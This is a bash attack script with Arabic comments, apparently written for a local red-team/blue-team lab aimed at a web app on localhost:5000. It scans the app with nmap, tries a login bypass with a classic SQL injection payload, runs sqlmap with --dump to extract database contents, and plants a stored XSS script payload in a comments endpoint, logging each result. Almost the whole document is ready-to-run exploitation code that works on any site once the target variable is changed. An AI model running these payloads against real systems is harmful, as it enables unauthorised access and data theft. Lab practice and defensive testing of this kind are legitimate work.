#!/bin/bash

TARGET="http://localhost:5000"
LOG="$HOME/ai-red-blue-lab/logs/red_team_report.txt"
mkdir -p "$HOME/ai-red-blue-lab/logs"

echo "================================================" | tee -a "$LOG"
echo "🔴 Red Team Attack Report - $(date)" | tee -a "$LOG"
echo "================================================" | tee -a "$LOG"

# ----------------------------------------
# المرحلة 1: الاستطلاع بـ nmap
# ----------------------------------------
echo -e "\n[1] 🔍 NMAP SCAN" | tee -a "$LOG"
nmap -sV -p 5000 localhost 2>&1 | tee -a "$LOG"

# ----------------------------------------
# المرحلة 2: اختبار SQL Injection يدوياً
# ----------------------------------------
echo -e "\n[2] 💉 SQL INJECTION - Manual Test" | tee -a "$LOG"

# محاولة تجاوز تسجيل الدخول
PAYLOAD="admin' OR '1'='1"
RESPONSE=$(curl -s -X POST "$TARGET/login" \
    --data-urlencode "username=$PAYLOAD" \
    --data-urlencode "password=anything")

if echo "$RESPONSE" | grep -q "Welcome"; then
    echo "✅ SQL Injection SUCCESSFUL! Bypassed login!" | tee -a "$LOG"
    echo "   Payload: $PAYLOAD" | tee -a "$LOG"
    echo "$RESPONSE" | grep -o "Welcome[^<]*" | tee -a "$LOG"
else
    echo "❌ Manual SQLi failed, trying sqlmap..." | tee -a "$LOG"
fi

# ----------------------------------------
# المرحلة 3: sqlmap التلقائي
# ----------------------------------------
echo -e "\n[3] 🤖 SQLMAP AUTO SCAN" | tee -a "$LOG"
sqlmap -u "$TARGET/login" \
    --data="username=admin&password=test" \
    --level=2 \
    --risk=1 \
    --batch \
    --dump \
    --output-dir="$HOME/ai-red-blue-lab/logs/sqlmap" \
    2>&1 | tee -a "$LOG"

# ----------------------------------------
# المرحلة 4: اختبار Stored XSS
# ----------------------------------------
echo -e "\n[4] 🎭 STORED XSS TEST" | tee -a "$LOG"

XSS_PAYLOAD='<script>alert("XSS_PWNED")</script>'
curl -s -X POST "$TARGET/comments" \
    --data-urlencode "comment=$XSS_PAYLOAD" > /dev/null

STORED=$(curl -s "$TARGET/comments")
if echo "$STORED" | grep -q "XSS_PWNED"; then
    echo "✅ Stored XSS SUCCESSFUL!" | tee -a "$LOG"
    echo "   Payload stored and reflected: $XSS_PAYLOAD" | tee -a "$LOG"
else
    echo "❌ XSS test inconclusive" | tee -a "$LOG"
fi

# ----------------------------------------
# ملخص نهائي
# ----------------------------------------
echo -e "\n================================================" | tee -a "$LOG"
echo "📋 SUMMARY" | tee -a "$LOG"
echo "================================================" | tee -a "$LOG"
echo "Target: $TARGET" | tee -a "$LOG"
echo "Report: $LOG" | tee -a "$LOG"
echo "Completed: $(date)" | tee -a "$LOG"
